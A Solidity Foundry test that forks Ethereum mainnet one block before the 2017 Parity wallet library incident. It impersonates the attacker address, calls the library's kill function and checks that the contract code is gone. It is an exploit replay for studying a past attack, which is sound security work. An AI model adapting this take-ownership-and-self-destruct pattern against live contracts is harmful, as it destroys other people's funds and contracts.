// SPDX-License-Identifier: MIT
pragma solidity >= 0.8.0;

import "test/utils/TestUtils.sol";
import "forge-std/Test.sol";

interface ParityWalletInterface {
    function kill(address) external;
    function isOwner(address _addr) external view returns (bool);
}

contract ParityWalletAttack is Test, TestUtils {
    address public constant WALLET = 0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4;

    address public constant DESTROYOR = 0xae7168Deb525862f4FEe37d987A971b385b96952;

    // We fork one block prior to the actual attack.
    uint256 public constant BLOCK_NUMBER = 4_501_968;

    function setUp() public {
        cheat.createSelectFork("mainnet", BLOCK_NUMBER);

        console.log("Setting up ParityWalletAttack, on block: ", block.number);

        ParityWalletInterface wallet = ParityWalletInterface(WALLET);
        bool isOwner = wallet.isOwner(address(DESTROYOR));
        assertEq(isOwner, true);

        // Wallet must have code prior to the attack.
        uint256 codeSize;
        assembly {
            codeSize := extcodesize(WALLET)
        }
        assert(codeSize > 0);
        console.log("Wallet code size prior to the attack: ", codeSize);

        vm.prank(address(DESTROYOR));
        wallet.kill(address(DESTROYOR));
    }

    function testWalletHasNoCode() public {
        uint256 codeSize;
        assembly {
            codeSize := extcodesize(WALLET)
        }
        assertEq(codeSize, 0);
        console.log("Wallet code size after the attack: ", codeSize);
    }
}
